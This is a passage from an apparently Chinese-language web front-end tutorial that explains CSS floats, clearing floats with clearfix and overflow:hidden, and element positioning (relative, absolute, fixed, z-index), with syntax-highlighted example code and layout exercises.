class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.con</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">450px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">210px</span>;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.pic</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">80px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: gold;</span><br><span class="line">        <span class="attribute">float</span>: left;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.text</span>&#123;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">130px</span>;</span><br><span class="line">        <span class="comment">/*background-color: green;*/</span></span><br><span class="line">        <span class="attribute">color</span>: <span class="number">#666</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">    &lt;div class="pic"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="text"&gt;浮动元素后面没有浮动的元素会占据浮动元素的位置，没有浮动的元素内的文字会避开浮动的元素，形成文字饶图的效果浮动元素后面没有浮动的元素会占据浮动元素的位置，没有浮动的元素内的文字会避开浮动的元素，形成文字饶图的效果浮动元素后面没有浮动的元素会占据浮动元素的位置，没有浮动的元素内的文字会避开浮动的元素，形成文字饶图的效果&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="3-10-2-清除浮动"><a href="#3-10-2-清除浮动" class="headerlink" title="3.10.2 清除浮动"></a>3.10.2 <strong>清除浮动</strong></h3><ul><li><p>父级上增加属性overflow：hidden</p></li><li><p>在最后一个子元素的后面加一个空的div，给它样式属性 clear:both（不推荐）</p></li><li><p>使用成熟的清浮动样式类，clearfix</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>,<span class="selector-class">.clearfix</span><span class="selector-pseudo">:before</span>&#123; <span class="attribute">content</span>: <span class="string">""</span>;<span class="attribute">display</span>: table;&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123; <span class="attribute">clear</span>:both;&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;<span class="attribute">zoom</span>:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>清除浮动的使用方法：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.con2&#123;... overflow:hidden&#125;</span><br><span class="line">或者</span><br><span class="line">&lt;div class="con2 clearfix"&gt;</span><br></pre></td></tr></table></figure><p><strong>理解练习</strong><br>父级盒子不给高度，子集盒子浮动，父级盒子需要清除浮动<br><img src="/qianduan_images/015.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">210px</span>;</span><br><span class="line">    <span class="comment">/*height: 400px;*/</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">list-style</span>: none;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 第一种清除浮动的方法 */</span></span><br><span class="line">    <span class="comment">/*overflow: hidden;*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.list</span> <span class="selector-tag">li</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第二种清除浮动的方法 */</span></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>,<span class="selector-class">.clearfix</span><span class="selector-pseudo">:before</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">    <span class="attribute">clear</span>:both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 兼容IE，网页不缩放 */</span></span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">    <span class="attribute">zoom</span>:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;!--ul.list&gt;li&#123;$&#125;*8--&gt;</span><br><span class="line">&lt;ul class="list clearfix"&gt;</span><br><span class="line">    &lt;li&gt;1&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;2&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;3&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;4&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;5&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;6&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;7&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;8&lt;/li&gt;</span><br><span class="line">    &lt;!<span class="selector-tag">--</span>第二种清除浮动的方法<span class="selector-tag">--</span>&gt;</span><br><span class="line">    &lt;!--&lt;div style="clear: both"&gt;&lt;/div&gt;--&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><h2 id="3-11-定位"><a href="#3-11-定位" class="headerlink" title="3.11 定位"></a>3.11 定位</h2><h3 id="3-11-1-文档流"><a href="#3-11-1-文档流" class="headerlink" title="3.11.1 文档流"></a>3.11.1 <strong>文档流</strong></h3><p>文档流，是指盒子按照html标签编写的顺序依次从上到下，从左到右排列，块元素占一行，行内元素在一行之内从左到右排列，先写的先排列，后写的排在后面，每个盒子都占据自己的位置。</p><h3 id="3-11-2-关于定位"><a href="#3-11-2-关于定位" class="headerlink" title="3.11.2 关于定位"></a>3.11.2 <strong>关于定位</strong></h3><p>我们可以使用css的position属性来设置元素的定位类型，postion的设置项如下：</p><ul><li>relative 生成相对定位元素，元素所占据的文档流的位置保留，元素本身相对自身原位置进行偏移。</li><li>absolute 生成绝对定位元素，元素脱离文档流，不占据文档流的位置，可以理解为漂浮在文档流的上方，相对于上一个设置了定位的父级元素来进行定位，如果找不到，则相对于body元素进行定位。</li><li>fixed 生成固定定位元素，元素脱离文档流，不占据文档流的位置，可以理解为漂浮在文档流的上方，相对于浏览器窗口进行定位。</li><li>static 默认值，没有定位，元素出现在正常的文档流中，相当于取消定位属性或者不设置定位属性。</li><li>inherit 从父元素继承 position 属性的值。</li></ul><p><img src="/qianduan_images/037.png" alt><br></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* relative 相对定位元素 */</span></span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.con</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box01</span>,<span class="selector-class">.box02</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box01</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box02</span>&#123;</span><br><span class="line"><span class="attribute">background-color</span>: gold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">    &lt;div class="box01"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="box02"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p></p><p><img src="/qianduan_images/038.png" alt></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* absolute 绝对定位元素:相对于body元素进行定位 */</span></span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.con</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box01</span>,<span class="selector-class">.box02</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box01</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: green;</span><br><span class="line">        <span class="attribute">position</span>: absolute;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">50px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box02</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: gold;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">    &lt;div class="box01"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="box02"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="/qianduan_images/039.png" alt><br></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* absolute 绝对定位元素:相对于上一个设置了定位的父级元素来进行定位 */</span></span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.con</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box01</span>,<span class="selector-class">.box02</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box01</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: green;</span><br><span class="line">        <span class="attribute">position</span>: absolute;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">50px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box02</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">    &lt;div class="box01"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="box02"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p></p><p><img src="/qianduan_images/040.png" alt></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fixed 固定定位元素:相对于浏览器窗口进行定位 */</span></span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.con</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box01</span>,<span class="selector-class">.box02</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box01</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box02</span>&#123;</span><br><span class="line"><span class="attribute">background-color</span>: gold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">    &lt;div class="box01"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="box02"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="3-11-3-定位元素的偏移"><a href="#3-11-3-定位元素的偏移" class="headerlink" title="3.11.3 定位元素的偏移"></a>3.11.3 <strong>定位元素的偏移</strong></h3><p>定位的元素还需要用left、right、top或者bottom来设置相对于参照元素的偏移值。</p><h3 id="3-11-4-定位元素层级"><a href="#3-11-4-定位元素层级" class="headerlink" title="3.11.4 定位元素层级"></a>3.11.4 <strong>定位元素层级</strong></h3><p>定位元素是浮动的正常的文档流之上的，可以用z-index属性来设置元素的层级</p><p>伪代码如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box01</span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;  <span class="comment">/* 设置了绝对定位 */</span></span><br><span class="line">    <span class="selector-tag">left</span><span class="selector-pseudo">:200px</span>;         <span class="comment">/* 相对于参照元素左边向右偏移200px */</span></span><br><span class="line">    <span class="selector-tag">top</span><span class="selector-pseudo">:100px</span>;          <span class="comment">/* 相对于参照元素顶部向下偏移100px */</span></span><br><span class="line">    <span class="selector-tag">z-index</span><span class="selector-pseudo">:10</span>          <span class="comment">/* 将元素层级设置为10(没有单位) 弹框使用：盖过所有的元素 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.con</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">position</span>: relative;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.con</span> <span class="selector-tag">div</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">        <span class="attribute">position</span>: absolute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box01</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: green;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">20px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">20px</span>;</span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box02</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: gold;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">40px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">40px</span>;</span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">11</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box03</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: rebeccapurple;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">60px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">60px</span>;</span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box04</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: pink;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">80px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">80px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">    &lt;div class="box01"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="box02"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="box03"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="box04"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="3-11-5-定位元素特性"><a href="#3-11-5-定位元素特性" class="headerlink" title="3.11.5 定位元素特性"></a>3.11.5 <strong>定位元素特性</strong></h3><p>绝对定位和固定定位的块元素和行内元素会自动转化为行内块元素</p><h3 id="3-11-6-理解练习"><a href="#3-11-6-理解练习" class="headerlink" title="3.11.6 理解练习"></a>3.11.6 <strong>理解练习</strong></h3><p>1、制作如下布局：<br><img src="/qianduan_images/016.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.con</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: gold;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">position</span>: relative;</span><br><span class="line">        <span class="comment">/*去掉尖角成圆的，若是圆形需要设置成50px*/</span></span><br><span class="line">        <span class="attribute">border-radius</span>: <span class="number">14px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.box</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">28px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">28px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: red;</span><br><span class="line">        <span class="attribute">color</span>: white;</span><br><span class="line">        <span class="attribute">text-align</span>: center;</span><br><span class="line">        <span class="attribute">line-height</span>: <span class="number">28px</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 位置 */</span></span><br><span class="line">        <span class="attribute">position</span>: absolute;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">86px</span>;</span><br><span class="line">        <span class="attribute">top</span>: -<span class="number">14px</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 变成圆的 */</span></span><br><span class="line">        <span class="attribute">border-radius</span>: <span class="number">14px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="con"&gt;</span><br><span class="line">    &lt;div class="box"&gt;5&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>2、固定在顶部的水平居中的菜单</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.menu</span>&#123;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: gold;</span><br><span class="line">        <span class="attribute">position</span>: fixed;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0px</span>;</span><br><span class="line">        <span class="comment">/* 根据窗口大小设置百分比 */</span></span><br><span class="line">        <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">        <span class="comment">/* 根据前面的百分比再进行偏移，负值表示往左侧偏移 */</span></span><br><span class="line">        <span class="attribute">margin-left</span>: -<span 